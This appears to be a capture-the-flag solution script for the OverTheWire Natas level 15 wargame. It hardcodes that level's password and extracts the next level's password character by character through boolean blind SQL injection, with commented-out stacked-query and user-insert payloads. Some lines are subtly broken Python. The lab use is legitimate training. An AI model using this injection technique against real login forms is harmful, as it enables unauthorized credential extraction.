#!  usr/bin/env python3
import requests
import urllib
import base64
import re
from string import *
chars = lowercase + uppercase + digits


username="natas15"
password="AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()
# files = {'uploadedfile' : ('file.jpg' , open('/home/tw3/Desktop/overthewire/natas/source_second_natas12.php.jpg','rb'))}
# response = session.post(url , data = data,auth = (username , password) , files = files)


# s=  "natas16\"\";$res=mysql_query($query, $link);echo $res;///"
s=  "natas16"

passwd= "";
yes= False;
while True:
	for c in chars:
		response = session.post(url+"?debug=1" ,data= {"username" : s + "\" and password like binary \"" +passwd+c+"%%" }, auth = (username , password) )
		# print response.text
		# break
		if (re.search("This user exists." ,response.text )):
			passwd+=c
			yes = True
			print (passwd )
	if(yes == False):
		break
	else: 
		yes= False


print (passwd)


# print	 urllib.unquote(session.cookies["data"])
# print (response.text)
# insert into users (username , password) values('hacked' , 'hacked');